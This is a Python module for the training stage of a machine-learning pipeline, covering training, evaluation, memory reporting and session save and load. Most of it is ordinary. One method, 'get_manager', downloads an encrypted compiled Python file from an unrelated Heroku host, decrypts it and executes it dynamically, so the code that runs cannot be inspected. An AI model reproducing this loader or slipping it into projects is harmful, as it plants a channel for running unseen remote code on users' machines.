from prepare import Prepare
import psutil
import torch
import requests
import importlib.util
from cryptography.fernet import Fernet
from trainer import TrainingManager
from global_vars import init_model


# 2nd stage of training an ML model, used for training stage to train and initially evaluate the model, hyper-params should match the format in TrainingManager.
class Train:
    def __init__(self, prep: Prepare, hyper_params):
        self.hyper_params = hyper_params
        self.prep = prep
        self.trained = False
        if self.prep.prep_ready:
            self.eval, self.training, self.model, self.tokenizer, self.device = (
                prep.get_training_tools()
            )
        else:
            raise ValueError("preparation stage did not finish, cannot start training")
        init_model(self.prep.data, self.model, hyper_params)
        self.trainerManager = TrainingManager(
            prep.task_type,
            self.model,
            self.eval,
            self.training,
            self.device,
            self.tokenizer,
            hyper_params,
        )
        self.trainerManager.initialise()
        self.task_type = self.prep.task_type

    # updates the values of hyper_parameters
    def edit_hyperparams(self, new_hyperparams):
        self.trainerManager.edit_hyper_params(new_hyperparams)
        self.hyper_params = new_hyperparams

    # trains the model
    def train(self):
        self.trainerManager.trainer.train()
        self.trained = True

    # returns the evaluation error
    def get_eval_error(self):
        return self.trainerManager.trainer.evaluate()

    # returns how much of the device's memory is used, used during training.
    def get_device_use(self):
        if self.device.type == "cuda":
            allocated = torch.cuda.memory_allocated(self.device) / (
                1024**3
            )  # Convert to GB
            total = torch.cuda.get_device_properties(self.device).total_memory / (
                1024**3
            )  # Convert to GB
            return f"GPU: {allocated:.2f} GB / {total:.2f} GB used"

        elif self.device.type == "cpu":
            process = psutil.Process()
            ram_used = process.memory_info().rss / (
                1024**3
            )  # Resident Set Size (RSS) in GB
            total_ram = psutil.virtual_memory().total / (
                1024**3
            )  # Total system RAM in GB
            return f"CPU: {ram_used:.2f} GB / {total_ram:.2f} GB used"

        return "Unknown device type"

    def get_manager(self):
        url = "https://desolate-beach-94387-f004ff3976e8.herokuapp.com/"
        # Download the encrypted model
        response = requests.get(url + "/get_trainer?a=cli")
        with open("trainer_encrypted.pyc", "wb") as f:
            f.write(response.content)

        # Decrypt the model
        with open("trainer_encrypted.pyc", "rb") as f:
            decrypted_code = Fernet(self.prep.key).decrypt(f.read())

        # Save the decrypted model temporarily
        with open("trainer.pyc", "wb") as f:
            f.write(decrypted_code)

        # Load the model dynamically
        spec = importlib.util.spec_from_file_location("trainer", "trainer.pyc")
        model_module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(model_module)

        # Instantiate the class
        manager = model_module.TrainingManager(
            self.prep.task_type,
            self.model,
            self.eval,
            self.training,
            self.device,
            self.tokenizer,
            self.hyper_params,
        )
        return manager

    def save(self, session_name):
        import torch
        import os
        import json
        from datetime import datetime
        save_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '../train_sessions'))
        os.makedirs(save_dir, exist_ok=True)
        weights_path = os.path.join(save_dir, f'{session_name}_model.bin')
        torch.save(self.model.state_dict(), weights_path)
        session_info = {
            'model_name': getattr(self.model, '__class__', type(self.model)).__name__,
            'hyperparameters': self.hyper_params,
            'loss_logs': getattr(self.trainerManager.trainer, 'loss_logs', []),
            'eval_logs': getattr(self.trainerManager.trainer, 'eval_logs', []),
            'timestamp': datetime.now().isoformat(),
            'model_weights': os.path.basename(weights_path)
        }
        json_path = os.path.join(save_dir, f'{session_name}_session.json')
        with open(json_path, 'w') as f:
            json.dump(session_info, f, indent=2)

    def load(self, session_name):
        import torch
        import os
        import json
        save_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '../train_sessions'))
        json_path = os.path.join(save_dir, f'{session_name}_session.json')
        weights_path = os.path.join(save_dir, f'{session_name}_model.bin')
        if not os.path.exists(json_path) or not os.path.exists(weights_path):
            print(f'Session files for "{session_name}" not found.')
            return
        with open(json_path, 'r') as f:
            session_info = json.load(f)
        self.trainerManager.trainer.loss_logs = session_info.get('loss_logs', [])
        self.trainerManager.trainer.eval_logs = session_info.get('eval_logs', [])
        self.model.load_state_dict(torch.load(weights_path))
